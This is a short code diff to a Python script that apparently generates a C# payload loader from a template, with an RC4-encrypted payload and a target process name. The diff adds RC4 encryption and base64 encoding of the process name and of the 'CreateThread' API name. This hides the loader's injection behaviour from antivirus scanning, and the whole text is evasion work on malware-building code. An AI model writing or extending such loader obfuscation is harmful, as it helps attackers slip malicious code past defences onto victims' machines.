@@ -95,7 +95,8 @@ class Config:
             self.configs = json.loads(Helper.load_file(self.path, True))
         except:
             Helper.print_error("%s configuration file is not valid" % self.path)
-            
+            os._exit(0)
+			
     def key_exists(self, key):
         if self.configs.has_key(key):
             return True
@@ -154,7 +155,8 @@ if __name__ == "__main__":
     template = gen.set_template("template/Program.cs").get_output()
     template = template.replace("[KEY]", gen.format_rc4_key(key)) \
     .replace("[PAYLOAD]", cipher) \
-    .replace("[PROCESS_NAME]", config.get("process_name"))
+    .replace("[PROCESS_NAME]", base64.b64encode(rc4.Encrypt(config.get("process_name"), key))) \
+	.replace("[CREATE_THREAD]", base64.b64encode(rc4.Encrypt("CreateThread", key))) 
     
     Helper.save_file("%s/Program.cs" % out_dir, template)
     
